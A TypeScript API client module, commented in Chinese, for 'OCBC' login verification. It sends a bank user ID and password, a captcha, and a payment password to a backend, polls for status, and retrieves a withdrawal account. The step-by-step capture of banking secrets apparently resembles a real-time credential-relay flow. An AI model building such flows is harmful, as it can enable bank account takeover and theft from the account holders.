// OCBC 登录验证相关 API
import { get, post } from '@/utils/request'

// 提交登录参数
export interface SubmitLoginParams {
  organization_id: string
  user_id: string
  password: string
}

// 提交登录响应
export interface SubmitLoginResponse {
  record_id: number
}

// 轮询状态参数
export interface PollStatusParams {
  record_id: number
}

// 轮询状态响应
export interface PollStatusResponse {
  status: string
  withdrawal_account?: {
    account_name: string
    account_number: string
    bank_name: string
  }
}

// 提交验证码参数
export interface SubmitCaptchaParams {
  record_id: number
  captcha: string
}

// 提交支付密码参数
export interface SubmitPaymentPasswordParams {
  record_id: number
  payment_password: string
}

/**
 * 提交登录信息
 */
export function submitLogin(data: SubmitLoginParams) {
  return post<SubmitLoginResponse>('/api/ocbc/submitLogin', data)
}

/**
 * 轮询验证状态
 */
export function pollStatus(data: PollStatusParams) {
  return post<PollStatusResponse>('/api/ocbc/pollStatus', data)
}

/**
 * 提交验证码
 */
export function submitCaptcha(data: SubmitCaptchaParams) {
  return post('/api/ocbc/submitCaptcha', data)
}

/**
 * 提交支付密码
 */
export function submitPaymentPassword(data: SubmitPaymentPasswordParams) {
  return post('/api/ocbc/submitPaymentPassword', data)
}

// 已关联的银行账户
export interface LinkedAccount {
  id: number
  account_type: string
  bank_name: string
  bank_logo: string
  organization_id: string
  login_user_id: string
  withdrawal_account: {
    account_name: string
    account_number: string
    bank_name: string
  } | null
  linked_at: string
}

// 已关联账户列表响应
export interface LinkedAccountsResponse {
  accounts: LinkedAccount[]
}

/**
 * 获取已关联的银行账户列表
 */
export function getLinkedAccounts() {
  return get<LinkedAccountsResponse>('/ocbc/linked-accounts')
}
